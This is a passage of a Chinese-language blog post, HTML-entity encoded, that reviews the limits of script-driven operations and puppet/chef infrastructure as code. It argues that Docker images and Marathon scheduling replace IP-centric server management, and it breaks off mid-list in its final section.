<h2 id="&#x5F00;&#x53D1;&#x95F9;&#x9769;&#x547D;&#x65F6;&#x4EE3;">&#x5F00;&#x53D1;&#x95F9;&#x9769;&#x547D;&#x65F6;&#x4EE3;</h2><p>&#x4F34;&#x968F; devops &#x540C;&#x65F6;&#x51FA;&#x73B0;&#x7684;&#x662F; infrastructure as code &#x7684;&#x63D0;&#x6CD5;&#x3002;&#x7B80;&#x5355;&#x6765;&#x8BF4;&#x5C31;&#x662F;&#x4E00;&#x5E2E;&#x5F00;&#x53D1;&#x6740;&#x5230;&#x8FD0;&#x7EF4;&#x9886;&#x57DF;&#x4E4B;&#x540E;&#xFF0C;&#x770B;&#x89C1;&#x8FD9;&#x4E9B;&#x8FD0;&#x7EF4;&#x5C45;&#x7136;&#x662F;&#x8FD9;&#x6837;&#x53BB;&#x7BA1;&#x7406;&#x73B0;&#x7F51;&#x72B6;&#x6001;&#x7684;&#x3002;&#x4E8E;&#x662F;&#x4ED6;&#x4EEC;&#x628A;&#x5199;&#x4EE3;&#x7801;&#x7684;&#x7ECF;&#x9A8C;&#x5E26;&#x8FC7;&#x6765;&#xFF0C;&#x5C06;&#x73B0;&#x7F51;&#x72B6;&#x6001;&#x5EFA;&#x7ACB;&#x6210;&#x6A21;&#x578B;&#xFF08;&#x6240;&#x8C13; code&#xFF09;&#xFF0C;&#x628A;&#x9884;&#x671F;&#x7684;&#x72B6;&#x6001;&#x63D0;&#x4EA4;&#x5230;&#x7248;&#x672C;&#x63A7;&#x5236;&#x4E2D;&#x3002;&#x5C31;&#x50CF;&#x5199;&#x4EE3;&#x7801;&#x4E00;&#x6837;&#xFF0C;&#x53BB;&#x7BA1;&#x7406;&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x3002;</p>
<p>&#x5F88;&#x591A;&#x540E;&#x53F0;&#x5F00;&#x53D1;&#x4E3B;&#x5BFC;&#x7684;&#x5C0F;&#x521B;&#x4E1A;&#x516C;&#x53F8;&#x76F4;&#x63A5;&#x8DF3;&#x8FC7;&#x4E86;&#x4E0A;&#x4E2A;&#x65F6;&#x4EE3;&#xFF0C;&#x8FD0;&#x7EF4;&#x81EA;&#x52A8;&#x5316;&#x4F53;&#x7CFB;&#x4ECE;&#x4E00;&#x5F00;&#x59CB;&#x5C31;&#x662F;&#x57FA;&#x4E8E; puppet &#x548C; chef &#x6765;&#x641E;&#x7684;&#x3002;&#x5E73;&#x5FC3;&#x800C;&#x8BBA;&#xFF0C;&#x7528; puppet &#x7684;&#x66F4;&#x591A;&#x662F;&#x7F3A;&#x5C11;&#x5386;&#x53F2;&#x5305;&#x88B1;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x56E0;&#x4E3A;&#x8FD0;&#x7EF4;&#x95EE;&#x9898;&#x6709;&#x591A;&#x590D;&#x6742;&#x3002;&#x5F88;&#x591A;&#x7BA1;&#x7406;&#x7684;&#x673A;&#x5668;&#x6570;&#x91CF;&#x4E0D;&#x8D85;&#x8FC7;&#x5341;&#x53F0;&#xFF0C;&#x5374;&#x5728;&#x5982;&#x4F55;&#x4F7F;&#x7528; puppet/chef &#x4E0A;&#x6D6A;&#x8D39;&#x5927;&#x628A;&#x65F6;&#x95F4;&#x7684;&#x56E2;&#x961F;&#x4E5F;&#x662F;&#x6709;&#x7684;&#x3002;&#x76F8;&#x53CD;&#x5F88;&#x591A;&#x5927;&#x516C;&#x53F8;&#x56E0;&#x4E3A;&#x6709;&#x6C89;&#x91CD;&#x7684;&#x5386;&#x53F2;&#x5305;&#x88B1;&#xFF0C;&#x548C;&#x5E9E;&#x5927;&#x7684;&#x4F20;&#x7EDF;&#x8FD0;&#x7EF4;&#x56E2;&#x961F;&#xFF0C;&#x8FD9;&#x79CD;&#x5F00;&#x53D1;&#x95F9;&#x9769;&#x547D;&#x7684;&#x8DEF;&#x53CD;&#x800C;&#x8D70;&#x4E0D;&#x901A;&#x3002;</p>
<p>&#x8FD9;&#x79CD;&#x505A;&#x6CD5;&#x4E3B;&#x8981;&#x662F;&#x89E3;&#x51B3;&#x4E86;&#x811A;&#x672C;&#x7684;&#x7BA1;&#x7406;&#x95EE;&#x9898;&#xFF0C;&#x800C;&#x4E14;&#x56E0;&#x4E3A;&#x76F4;&#x63A5;&#x5B9A;&#x4E49;&#x4E86;&#x73B0;&#x7F51;&#x72B6;&#x6001;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4E4B;&#x95F4;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x4E5F;&#x4F1A;&#x597D;&#xFFFD;&#xFFFD;&#xFFFD;&#x591A;&#x3002;&#x4F46;&#x662F;&#x5149;&#x9C9C;&#x4EAE;&#x4E3D;&#x7684;&#x6A21;&#x578B;&#x80CC;&#x540E;&#x672C;&#x8D28;&#x4E0A;&#x8FD8;&#x662F;&#x4E00;&#x5806;&#x811A;&#x672C;&#x6765;&#x9A71;&#x52A8;&#x7684;&#x3002;&#x4E0A;&#x4E2A;&#x65F6;&#x4EE3;&#x7684;&#x5F0A;&#x7AEF;&#x53EA;&#x662F;&#x7ECF;&#x8FC7;&#x4E86;&#x5305;&#x88C5;&#x548C;&#x6539;&#x826F;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x6839;&#x9664;</p>
<ul>
<li>&#x5E94;&#x7528;&#x9884;&#x671F;&#x72B6;&#x6001;&#x5230;&#x73B0;&#x7F51;&#x4F9D;&#x9760;&#x7684;&#x8FD8;&#x662F;&#x8DD1;&#x811A;&#x672C;&#x3002;&#x800C;&#x4E14;&#x4E0E;&#x4E4B;&#x524D;&#x4E0D;&#x540C;&#xFF0C;&#x73B0;&#x5728;&#x66F4;&#x591A;&#x7684;&#x662F;&#x8DD1;&#x522B;&#x4EBA;&#x5199;&#x7684;cookbook&#x4E86;&#xFF0C;&#x8D28;&#x91CF;&#x4E5F;&#x662F;&#x826F;&#x83A0;&#x4E0D;&#x9F50;&#x7684;</li>
<li>&#x867D;&#x7136;&#x5B9A;&#x4E49;&#x4E86;&#x9884;&#x671F;&#x7684;&#x73B0;&#x7F51;&#x72B6;&#x6001;&#xFF0C;&#x4F46;&#x662F;&#x8D77;&#x70B9;&#x4E0D;&#x540C;&#xFF08;&#x6BD4;&#x5982;&#x4ECE;a=&gt;c, b=&gt;c&#xFF09;&#x9700;&#x8981;&#x505A;&#x7684;&#x5347;&#x7EA7;&#x64CD;&#x4F5C;&#x53EF;&#x80FD;&#x5B8C;&#x5168;&#x662F;&#x4E0D;&#x540C;&#x7684;&#x3002;&#x8981;&#x7F16;&#x5199;&#x4E00;&#x4E2A;&#x9762;&#x9762;&#x4FF1;&#x5230;&#x7684;&#x5347;&#x7EA7;&#x811A;&#x672C;&#x5176;&#x5B9E;&#x975E;&#x5E38;&#x56F0;&#x96BE;&#x3002;</li>
</ul>
<h2 id="&#x8FD8;&#x6709;&#x54EA;&#x4E9B;&#x95EE;&#x9898;&#xFF1F;">&#x8FD8;&#x6709;&#x54EA;&#x4E9B;&#x95EE;&#x9898;&#xFF1F;</h2><p>&#x4E00;&#x81F4;&#x6027;&#x548C;&#x7A33;&#x5B9A;&#x6027;&#x662F;&#x6700;&#x5927;&#x7684;&#x95EE;&#x9898;&#x3002;&#x670D;&#x52A1;&#x5668;&#x5F00;&#x673A;&#x4E4B;&#x540E;&#xFF0C;&#x5E38;&#x5E74;&#x662F;&#x4E0D;&#x91CD;&#x88C5;&#x7CFB;&#x7EDF;&#x7684;&#x3002;&#x65E0;&#x6570;&#x4EBA;&#x5728;&#x4E0A;&#x9762;&#x8DD1;&#x8FC7;&#x811A;&#x672C;&#xFF0C;&#x6267;&#x884C;&#x8FC7;&#x547D;&#x4EE4;&#xFF0C;&#x5B9A;&#x4F4D;&#x8FC7;&#x95EE;&#x9898;&#x3002;&#x670D;&#x52A1;&#x5668;&#x5B9E;&#x9645;&#x7684;&#x72B6;&#x6001;&#x662F;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x7CBE;&#x786E;&#x7BA1;&#x63A7;&#x7684;&#x3002;infrastructure as code &#x662F;&#x4E00;&#x79CD;&#x6539;&#x826F;&#xFF0C;&#x4F46;&#x662F;&#x4ECD;&#x672A;&#x6839;&#x9664;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x3002;&#x6BCF;&#x4E00;&#x6B21;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x8DD1;&#x811A;&#x672C;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x4E00;&#x79CD;&#x8D4C;&#x535A;&#xFF0C;&#x56E0;&#x4E3A;&#x6CA1;&#x6709;&#x4E24;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x662F;&#x5B8C;&#x5168;&#x4E00;&#x6837;&#x7684;&#x3002;&#x5728;&#x672C;&#x5730;&#x6D4B;&#x8BD5;&#x53EF;&#x884C;&#x7684;&#x811A;&#x672C;&#xFF0C;&#x672A;&#x5FC5;&#x5728;&#x53E6;&#x5916;&#x4E00;&#x53F0;&#x4E0A;&#x4E0D;&#x4F1A;&#x5F15;&#x8D77;&#x95EE;&#x9898;&#x3002;&#x8FD9;&#x4E0D;&#x662F;&#x5F3A;&#x8C03;&#x4E00;&#x4E0B;&#x4EE3;&#x7801;&#x91CC;&#x4E0D;&#x80FD; rm <em> &#xFF0C;&#x800C;&#x8981; rm path/</em> &#x5C31;&#x53EF;&#x4EE5;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;&#x3002;</p>
<p>&#x7248;&#x672C;&#x7BA1;&#x7406;&#x5176;&#x5B9E;&#x4E00;&#x76F4;&#x662F;&#x6CA1;&#x6709;&#x7684;&#x3002;&#x505A;&#x8FC7;&#x5F00;&#x53D1;&#x7684;&#x4EBA;&#xFF0C;&#x53EF;&#x80FD;&#x8FD8;&#x4F1A;&#x7528; git/svn &#x6765;&#x4F5C;&#x4E3A;&#x90E8;&#x7F72;&#x7684;&#x57FA;&#x7EBF;&#xFF0C;&#x57FA;&#x672C;&#x7684;&#x7248;&#x672C;&#x90FD;&#x4F1A;&#x63D0;&#x4EA4;&#x5230;&#x4ED3;&#x5E93;&#x91CC;&#x3002;&#x66F4;&#x591A;&#x7684;&#x4E00;&#x7EBF;&#x8FD0;&#x7EF4;&#x7528;&#x7684;&#x8FD8;&#x662F; rsync &#x7684;&#x6A21;&#x5F0F;&#x3002;rsync &#x7684;&#x610F;&#x601D;&#x5C31;&#x662F;&#x8981;&#x5B89;&#x88C5;&#x4E00;&#x4E2A;&#x65B0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x9700;&#x8981;&#x627E;&#x4E00;&#x53F0;&#x201C;&#x4E0E;&#x4E4B;&#x6700;&#x50CF;&#x201D;&#x7684;&#x670D;&#x52A1;&#x5668;&#x3002;&#x7136;&#x540E;&#x628A;&#x6587;&#x4EF6;&#x62F7;&#x8D1D;&#x5230;&#x65B0;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x628A;&#x914D;&#x7F6E;&#x4FEE;&#x6539;&#x4E00;&#x4E0B;&#xFF0C;&#x542F;&#x52A8;&#x5B8C;&#x4E8B;&#x3002;&#x643A;&#x7A0B;&#x51FA;&#x4E8B;&#x4E86;&#xFF0C;&#x6211;&#x4E2A;&#x4EBA;&#x731C;&#x6D4B;&#x5E94;&#x8BE5;&#x4E0E;&#x7248;&#x672C;&#x7BA1;&#x7406;&#x6DF7;&#x4E71;&#x6709;&#x5173;&#x7CFB;&#x3002;</p>
<p>&#x6545;&#x969C;&#x66FF;&#x6362;&#x662F;&#x975E;&#x5E38;&#x56F0;&#x96BE;&#x7684;&#x3002;&#x5148;&#x4E0D;&#x8BF4;&#x6545;&#x969C;&#x66FF;&#x6362;&#xFF0C;&#x5C31;&#x662F;&#x6545;&#x969C;&#x673A;&#x5254;&#x9664;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x5934;&#x75BC;&#x7684;&#x4E8B;&#x60C5;&#x3002;&#x6BD4;&#x5982; zookeeper&#x3002;&#x5404;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x90FD;&#x786C;&#x7F16;&#x7801;&#x4E09;&#x4E2A; ip &#x5730;&#x5740;&#x3002;&#x4E00;&#x65E6;&#x5176;&#x4E2D;&#x4E00;&#x4E2A; ip &#x6302;&#x6389;&#x4E86;&#x3002;zookeepr&#x6309;&#x7167;&#x9AD8;&#x53EF;&#x7528;&#x534F;&#x8BAE;&#x53EF;&#x4EE5;&#x4FDD;&#x6301;&#x6B63;&#x5E38;&#xFF0C;&#x4F46;&#x662F;&#x957F;&#x671F;&#x6765;&#x8BF4;&#x8FD9;&#x4E2A;&#x6302;&#x6389;&#x7684;ip&#x8FD8;&#x662F;&#x8981;&#x4ECE;&#x5404;&#x4E2A;&#x4F7F;&#x7528;&#x65B9;&#x91CC;&#x5254;&#x9664;&#x7684;&#x3002;&#x8FD9;&#x4E2A;&#x5C31;&#x4E14;&#x6539;&#x4E86;&#x3002;&#x4E00;&#x65E6;&#x4E1A;&#x52A1;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#x505A;&#x5F97;&#x4E0D;&#x597D;&#xFF0C;&#x9700;&#x8981;&#x8FD0;&#x7EF4;&#x6765;&#x641E;&#x4E00;&#x4E9B;&#x63A5;&#x544A;&#x8B66;&#x4E4B;&#x540E;&#x66FF;&#x6362;&#x6545;&#x969C;&#x673A;&#x7684;&#x4E8B;&#x60C5;&#xFF0C;&#x90A3;&#x5C31;&#x662F;&#x5404;&#x79CD;&#x811A;&#x672C;&#x6298;&#x817E;&#x5404;&#x79CD;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x8282;&#x594F;&#x4E86;&#x3002;</p>
<h2 id="Docker_&#x662F;&#x5982;&#x4F55;&#x6380;&#x684C;&#x5B50;&#x7684;">Docker &#x662F;&#x5982;&#x4F55;&#x6380;&#x684C;&#x5B50;&#x7684;</h2><p>&#x4E24;&#x70B9;&#x795E;&#x8BBA;&#xFF0C;&#x8FDB;&#x5165;&#x5230; Docker &#x65F6;&#x4EE3;&#x4E4B;&#x540E;</p>
<ul>
<li>CMDB &#x4E0D;&#x518D;&#x81F3;&#x5173;&#x91CD;&#x8981;&#x4E86;&#x3002;CMDB &#x8FDE;&#x540C;IP&#xFF0C;&#x4EE5;&#x53CA;&#x670D;&#x52A1;&#x5668;&#x8D44;&#x6E90;&#x53D8;&#x6210;&#x5E95;&#x5C42;&#x84DD;&#x9886;&#x5DE5;&#x4EBA;&#x5173;&#x5FC3;&#x7684;&#x95EE;&#x9898;&#x4E86;&#x3002;&#x4E0A;&#x5C42;&#x7684;&#x540E;&#x53F0;&#x5F00;&#x53D1;&#x548C;&#x4E1A;&#x52A1;&#x8FD0;&#x7EF4;&#x4E0D;&#x518D;&#x9700;&#x8981;&#x4E5F;&#x65E0;&#x6CD5;&#x518D;&#x4EE5; IP &#x4E3A;&#x4E2D;&#x5FC3;&#x7684; CMDB &#x6765;&#x7BA1;&#x7406;&#x914D;&#x7F6E;&#x3002;</li>
<li>&#x5206;&#x5E03;&#x5F0F;&#x811A;&#x672C;&#x6267;&#x884C;&#x5E73;&#x53F0;&#x4ECE;&#x6838;&#x5FC3;&#x4F5C;&#x4E1A;&#x7CFB;&#x7EDF;&#x9000;&#x5C45;&#x4E8C;&#x7EBF;&#x3002;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4E0D;&#x518D;&#x9700;&#x8981;&#x53D8;&#x66F4;&#x4E86;&#xFF0C;&#x5E38;&#x89C4;&#x7684;&#x4E0A;&#x65B0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x53D1;&#x5E03;&#x65B0;&#x7248;&#x672C;&#x90FD;&#x4E0D;&#x518D;&#x4F9D;&#x8D56;&#x811A;&#x672C;&#x5728;&#x4E00;&#x4E2A;&#x5DF2;&#x6709;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x6267;&#x884C;&#x53BB;&#x4FEE;&#x6539;&#x72B6;&#x6001;&#x3002;&#x800C;&#x662F;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x5BB9;&#x5668;&#x3002;</li>
</ul>
<p>Docker&#x7684;&#x5B9E;&#x8D28;&#x662F;&#x4E00;&#x4E2A;&#x771F;&#x6B63;&#x7684;&#x7248;&#x672C;&#x7BA1;&#x7406;&#x5DE5;&#x5177;&#x3002;&#x5728; Docker &#x4E4B;&#x524D;&#x7248;&#x672C;&#x7BA1;&#x7406;&#x662F;&#x5404;&#x79CD;&#x62FC;&#x51D1;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x3002;&#x4EC0;&#x4E48;&#x662F;&#x7248;&#x672C;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x662F;&#x7531;&#x4E09;&#x90E8;&#x5206;&#x7EC4;&#x6210;&#xFF1A;&#x7248;&#x672C;&#x3001;&#x914D;&#x7F6E;&#x3001;&#x6570;&#x636E;&#x3002;&#x6240;&#x8C13;&#x7248;&#x672C;&#x5C31;&#x662F;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#xFF0C;&#x4EE5;&#x53CA;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7684;&#x914D;&#x7F6E;&#x3002;&#x5404;&#x79CD;&#x7B2C;&#x4E09;&#x65B9;&#x5305;&#xFF0C;&#x5F00;&#x53D1;&#x7ED9;&#x7684;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#xFF0C;&#x548C;&#x4E00;&#x90E8;&#x5206;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;&#x8FD9;&#x4E9B;&#x7684;&#x96C6;&#x5408;&#x662F;&#x4E00;&#x4E2A;&#x7248;&#x672C;&#xFF0C;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x53EF;&#x6267;&#x884C;&#x73AF;&#x5883;&#x3002;&#x9664;&#x6B64;&#x4E4B;&#x5916;&#x4E00;&#x822C;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x91CC;&#x9762;&#x653E;&#x4E86;&#x4E24;&#x90E8;&#x5206;&#x5185;&#x5BB9;&#xFF0C;&#x4E00;&#x90E8;&#x5206;&#x662F;&#x7BA1;&#x7406;&#x5458;&#x53EF;&#x4EE5;&#x4ECE;&#x9875;&#x9762;&#x4E0A;&#x4FEE;&#x6539;&#x7684;&#x914D;&#x7F6E;&#xFF0C;&#x4E00;&#x90E8;&#x5206;&#x662F;&#x4E1A;&#x52A1;&#x6570;&#x636E;&#x3002;&#x5728; puppet &#x65F6;&#x4EE3;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x662F;&#x4E00;&#x4E2A;&#x7533;&#x660E;&#x6587;&#x4EF6;&#x3002;&#x8FD9;&#x4E2A;&#x7533;&#x660E;&#x6587;&#x4EF6;&#x6267;&#x884C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x4ECE;&#x67D0;&#x4E2A; ISO &#xFFFD;&#xFFFD;&#xFFFD;&#x88C5;&#x51FA;&#x4E00;&#x4E2A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#xFF0C;&#x7136;&#x540E;&#x7528; apt-get/yum &#x4ECE;&#x67D0;&#x4E2A;&#x955C;&#x50CF;&#x6E90;&#x5B89;&#x88C5;&#x4E00;&#x5806;&#x7CFB;&#x7EDF;&#x7684;&#x5305;&#xFF0C;&#x7136;&#x540E;&#x7528; pip/bundle &#x5B89;&#x88C5;&#x4E00;&#x5806; python/ruby &#x8BED;&#x8A00;&#x5C42;&#x9762;&#x7684;&#x5305;&#xFF0C;&#x6700;&#x540E;&#x624D;&#x662F;&#x5F00;&#x53D1;&#x7ED9;&#x4F60;&#x7684; git/svn/&#x67D0;&#x4E2A;&#x4E0D;&#x77E5;&#x540D;&#x7684;tar.gz&#x3002;&#x4F60;&#x4EE5;&#x4E3A;&#x8FD9;&#x4E9B;&#x4E1C;&#x897F;&#x6BCF;&#x6B21;&#x62FC;&#x88C5;&#x51FA;&#x6765;&#x7684;&#x4E1C;&#x897F;&#x90FD;&#x662F;&#x540C;&#x6837;&#x7684;&#x7248;&#x672C;&#x4E48;&#xFF1F;&#x5176;&#x5B9E;&#x672A;&#x5FC5;&#x3002;&#x60F3;&#x5F53;&#x5E74;&#x67D0;&#x5899;&#x5E72;&#x6389; github &#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4E0D;&#x77E5;&#x9053;&#x591A;&#x5C11;&#x4EBA;&#x65E0;&#x6CD5;&#x505A;&#x53D1;&#x5E03;&#x4E86;&#x3002;Docker &#x6253;&#x5305;&#x51FA;&#x7684;&#x8FDE;&#x7CFB;&#x7EDF;&#x5728;&#x4E00;&#x8D77;&#x7684;&#x955C;&#x50CF;&#xFF0C;&#x5176;&#x5B9E;&#x662F;&#x5BF9;&#x7248;&#x672C;&#x7684;&#x6700;&#x597D;&#x9610;&#x8FF0;&#x3002;</p>
<p>&#x4F7F;&#x7528; Docker &#x4E4B;&#x540E;&#x4E0D;&#x518D;&#x9700;&#x8981;&#x4FEE;&#x6539;&#x73B0;&#x7F51;&#x7684; container &#x4E86;&#x3002;&#x4E00;&#x4E2A; container &#x5982;&#x679C;&#x9700;&#x8981;&#x5347;&#x7EA7;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x628A;&#x5B83;&#x5E72;&#x6389;&#xFF0C;&#x518D;&#x628A;&#x9884;&#x5148;&#x505A;&#x597D;&#x7684;&#x65B0;&#x7684;&#x955C;&#x50CF;&#x53D1;&#x5E03;&#x6210;&#x4E00;&#x4E2A;&#x65B0;&#x7684; container &#x66FF;&#x6362;&#x4E0A;&#x53BB;&#x3002;&#x5206;&#x5E03;&#x5F0F;&#x811A;&#x672C;&#x6267;&#x884C;&#xFF0C;&#x53D8;&#x6210;&#x4E86;&#x5206;&#x5E03;&#x5F0F;&#x5BB9;&#x5668;&#x66FF;&#x6362;&#x4E86;&#x3002;&#x5F53;&#x7136;&#x8FD9;&#x79CD;&#x6807;&#x51C6;&#x5316;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x7528; mesos + marathon &#x5DF2;&#x7ECF;&#x5B8C;&#x7F8E;&#x89E3;&#x51B3;&#x4E86;&#x3002;</p>
<p>&#x4F7F;&#x7528; Docker &#x4E4B;&#x540E;&#xFF0C;&#x65E0;&#x6CD5;&#x518D;&#x57FA;&#x4E8E; IP &#x505A;&#x7BA1;&#x7406;&#x4E86;&#x3002;&#x5012;&#x4E0D;&#x662F;&#x7ED9;&#x6BCF;&#x4E2A; container &#x5206;&#x914D;&#x4E00;&#x4E2A; IP &#x5206;&#x914D;&#x4E0D;&#x8FC7;&#x6765;&#xFF0C;&#x800C;&#x662F; IP &#x4EE3;&#x8868;&#x7684;&#x9759;&#x6001;&#x6A21;&#x578B;&#x65E0;&#x6CD5;&#x8DDF;&#x4E0A;&#x65F6;&#x4EE3;&#x4E86;&#x3002;&#x57FA;&#x4E8E; IP &#x7BA1;&#x7406;&#xFF0C;&#x5C31;&#x610F;&#x5473;&#x4F60;&#x4F1A;&#x57FA;&#x4E8E; SSH &#x767B;&#x9646;&#x8FD9;&#x4E2A; IP &#x6765;&#x7BA1;&#x7406;&#x3002;&#x8FD9;&#x79CD;&#x601D;&#x60F3;&#x4ECE;&#x9AA8;&#x5B50;&#x91CC;&#x5C31;&#x662F;&#x843D;&#x540E;&#x7684;&#x4E86;&#x3002;&#x8FDB;&#x7A0B;&#xFF0C;&#x8FDB;&#x7A0B;&#x7EC4;&#xFF0C;&#x6A21;&#x5757;&#xFF0C;set &#x8FD9;&#x4E9B;&#x624D;&#x662F;&#x7BA1;&#x7406;&#x7684;&#x7C92;&#x5EA6;&#x3002;&#x81F3;&#x4E8E;&#x8FDB;&#x7A0B;&#x662F;&#x8DD1;&#x5728;&#x54EA;&#x4E2A; IP &#x4E0A;&#x7684;&#x54EA;&#x4E2A;&#x5BB9;&#x5668;&#x91CC;&#xFF0C;&#x4E0D;&#x518D;&#x91CD;&#x8981;&#x4E86;&#x3002;&#x4E00;&#x56FE;&#x53EF;&#x4EE5;&#x8BF4;&#x660E;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF1B;</p>
<p><img src="http://img0.tuicool.com/VVVRz2.png" alt=""></p>
<p>&#x4E0A;&#x9762;&#x8FD9;&#x4E2A;&#x6269;&#x5BB9;&#x7684;&#x6309;&#x94AE;&#x70B9;&#x5B8C;&#x4E4B;&#x540E;&#x6709;&#x8BA9;&#x4F60;&#x586B; IP &#x5417;&#xFF1F;&#x6CA1;&#x6709;&#xFF01;&#x4F60;&#x53EA;&#x9700;&#x8981;&#x544A;&#x8BC9;marathon&#xFF0C;&#x6211;&#x8981;32&#x4E2A;&#x8FDB;&#x7A0B;&#x5B9E;&#x4F8B;&#x3002;&#x5B83;&#x5C31;&#x4F1A;&#x53BB;&#x627E;&#x8FD9;&#x4E9B;&#x8D44;&#x6E90;&#x8FD0;&#x884C;&#x8FD9; 32 &#x4E2A;&#x5B9E;&#x4F8B;&#x3002;&#x4E1A;&#x52A1;&#x6700;&#x7EC8;&#x9700;&#x8981;&#x7684;&#x662F; 32 &#x4E2A;&#x8FDB;&#x7A0B;&#xFF0C;&#x800C;&#x4E0D;&#x662F; 32 &#x4E2A; IP&#x3002;IP&#x53EA;&#x662F;&#x8FD0;&#x884C;&#x8FDB;&#x7A0B;&#x9700;&#x8981;&#x7684;&#x8D44;&#x6E90;&#x800C;&#x5DF2;&#x3002;&#x5B9E;&#x9645;&#x8FD0;&#x884C;&#x7684;&#x65F6;&#x5019;&#x8FDB;&#x7A0B;&#x53EF;&#x80FD;&#x662F;&#x5728;&#x4E00;&#x4E2A;IP&#x4E0A;&#x542F;&#x52A8;&#x4E86;32&#x4E2A;&#x7AEF;&#x53E3;&#xFF0C;&#x4E5F;&#x53EF;&#x80FD;&#x662F;&#x968F;&#x673A;&#x5206;&#x914D;&#x4E86;5&#x4E2A;IP&#xFF0C;&#x6BCF;&#x4E2A;&#x5404;&#x8DD1;&#x4E86;&#x4E00;&#x4E9B;&#x7AEF;&#x53E3;&#x3002;&#x5F53;&#x7136;&#x8FD9;&#x4E9B;&#x5206;&#x914D;&#x90FD;&#x662F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x201C;&#x7EA6;&#x675F;&#x201D;&#x7684;&#x65B9;&#x5F0F;&#x8868;&#x8FBE;&#x7684;&#x3002;&#x800C;&#x4E0D;&#x662F;&#x8BA9;&#x4F60;&#x53BB;&#x641E;32&#x4E2A;IP&#x6765;&#xFF0C;&#x518D;&#x8DD1;&#x4E2A;&#x811A;&#x672C;&#x53BB;&#x8FD9;&#x4E9B;IP&#x4E0A;&#x90E8;&#x7F72;&#x8FD9;&#x4E9B;&#x8FDB;&#x7A0B;&#x3002;</p>
<h2 id="Last_Puzzle">Last Puzzle</h2><p>&#x62FC;&#x56FE;&#x6E38;&#x620F;&#x5C31;&#x5DEE;&#x6700;&#x540E;&#x8FD9;&#x4E00;&#x5757;&#x4E86;&#x3002;Docker &#x505A;&#x4E3A;&#x4E00;&#x4E2A;&#x7248;&#x672C;&#x5DE5;&#x5177;&#x662F;&#x7EDD;&#x5BF9;&#x5408;&#x683C;&#x7684;&#x3002;Marathon &#x4EE5; Docker &#x7684;&#x65B9;&#x5F0F;&#x6258;&#x7BA1;&#x6240;&#x6709;&#x8FDB;&#x7A0B;&#x4E5F;&#x662F;&#x9760;&#x8C31;&#x7684;&#x3002;&#x4F46;&#x662F;&#x8FD8;&#x4E0D;&#x5B8C;&#x6574;&#xFF1A;</p>
<ul>
<li>Docker&#x955C;&#x50CF;&#x4F5C;&#x4E3A;&#x7248;&#x672C;&#x53D1;&#x5E03;&#x5230;&#x73B0;&#x7F51;&#x4E4B;&#x540E;&#x662F;&#x65E0;&#x6CD5;&#x8FD0;&#x884C;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x4EFB;&#x4F55;&#x4E00;&#x4E2A;&#x5E94;&#x7528;&#x8D77;&#x7801;&#x90FD;&#x6709;&#x597D;&#x51E0;&#x4E2A;&#x670D;&#x52A1;&#x8981;&#x4E92;&#x76F8;&#x8BBF;&#x95EE;&#x3002;&#x8FD9;&#x4E9B;&#x786C;&#x7F16;&#x7801;&#x5728;&#x955C;&#x50CF;&#x91CC;&#x7684; IP &#x5730;&#x5740;&#x6362;&#x4E86;&#x4E00;&#x4E2A;&#x73AF;&#x5883;&#x662F;&#x65E0;&#x6CD5;&#x6267;&#x884C;&#x7684;&#x3002;&#x4E00;&#x4E2A;&#x7248;&#x672C;&#x91CC;&#x4EFB;&#x4F55;&#x914D;&#x7F6E;&#x90FD;&#x53EF;&#x4EE5;&#x786C;&#x7F16;&#x7801;&#xFF0C;&#x5C31;&#x662F; IP &#x5730;&#x5740;&#x548C;&#x7AEF;&#x53E3;&#x662F;&#x6CA1;&#x786C;&#x7F16;&#x7801;&#x7684;&#x3002;</li>
